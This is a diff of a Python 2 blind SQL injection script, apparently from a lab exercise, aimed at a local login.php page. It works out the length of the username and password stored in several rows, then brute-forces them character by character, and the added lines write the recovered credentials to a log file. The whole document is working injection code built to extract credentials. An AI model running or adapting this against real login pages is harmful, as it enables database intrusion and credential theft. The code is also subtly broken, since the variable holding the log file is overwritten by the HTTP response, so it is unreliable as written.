@@ -14,7 +14,7 @@ request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%2098%20AND%20SUBS
 #print error
 #print bashCommand
 
-
+f= open("logs.txt","w+")
 listASCII=string.printable
 iterator=cycle(['username','password'])
 for row in xrange(95,101):
@@ -22,7 +22,7 @@ for row in xrange(95,101):
 		field=iterator.next()
 		print field
 		size = 0;
-		for s in xrange(0,40):
+		for s in xrange(0,100):
 			request = "http://localhost/lab09/login.php?u=\"%20OR%20id%20=%20" + str(row) + "%20AND%20length(" + str(field) + ")%20=%20" + str(s) + "--%20"
 			f = urllib.urlopen(request)
 			response = f.read()
@@ -30,7 +30,7 @@ for row in xrange(95,101):
 				print "found size : %s" %s
 				size = s
 				break
-
+		word=""
 		for pos in xrange(1,size+1):
 
 			for c in xrange(0,128):
@@ -39,8 +39,14 @@ for row in xrange(95,101):
 				response = f.read()
 				if (response.find('cat.JPG')!=-1): 
 					print "found letter %s at position %d" %(listASCII[c],pos)
+					word += listASCII[c]
 					break
-
+		f.write(word)
+		f.write("     ")
+		
+	f.write("\n")
+	
+f.close()		
 
 			
 
